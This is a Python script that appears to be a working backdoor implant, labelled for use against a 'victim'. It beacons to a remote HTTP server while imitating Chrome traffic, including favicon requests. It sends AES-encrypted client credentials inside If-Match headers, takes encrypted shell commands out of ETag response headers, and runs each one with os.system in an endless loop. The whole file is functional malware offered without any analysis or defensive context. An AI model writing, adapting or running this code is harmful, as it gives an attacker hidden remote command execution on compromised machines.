 #!/usr/bin/env python

import sys
import http.client
import urllib
import time
import os
import re

from Crypto.Cipher import AES

#change for each victime. must be of length 16 or implement padding.
unique_client_id='11223344'
unique_client_key='23AB5CF.'
client_creds=unique_client_id+unique_client_key 

key = b'\x9b)\xbf\xc3R\xb0/\xea\xb7\xbc3\xba\xf3\xdf\xf3}'

creds_iv=b's\x9f\xd3w\xac\x92\xa2\xcb\xe9\xf7\xec>\x0ep\x1e '
cipher=AES.new(key,AES.MODE_CBC,creds_iv)


#get http server ip
http_server = sys.argv[1]
#create a connection
conn = http.client.HTTPConnection(http_server, 8082)

#first etag sent to server is victim creds
creds_etag=cipher.encrypt(bytes(client_creds,'ascii'))
etag = creds_etag

#continues aes key (chain) - to decrypt commands from server
etag_decryptor = AES.new(key,AES.MODE_CBC,creds_etag)


headers = {'Connection': 'keep-alive','Upgrade-Insecure-Requests': '1', "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Language': 'en-US,en;q=0.9'}

favicon_headers = {
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
}

command = ""


while 1:
    #sends prev(or init) etag in "if-match" header
    headers.update({"If-Match":etag.hex()})
    conn.request('GET', '/home_new.html',  headers=headers)
    rsp = conn.getresponse()
    data_received = rsp.read()
    
    #emulate chrome browser and get favicon.ico
    conn.request('GET', '/favicon.ico',  headers=favicon_headers) 
    favicon_data = conn.getresponse()
    
    #receives long commands in chunks
    etag= bytes.fromhex(rsp.getheader("ETag"))
    command_chunk = etag_decryptor.decrypt(etag).decode('ascii')
    command+=command_chunk
    if command[-1] == '\x00':
        print(command)
        command=command.rstrip('\x00')
        os.system(command)
        command =""
    

    #command = re.search("<title>(.*?)</title>", str(data_received)).group(1)
    
    
    time.sleep(3)
conn.close()
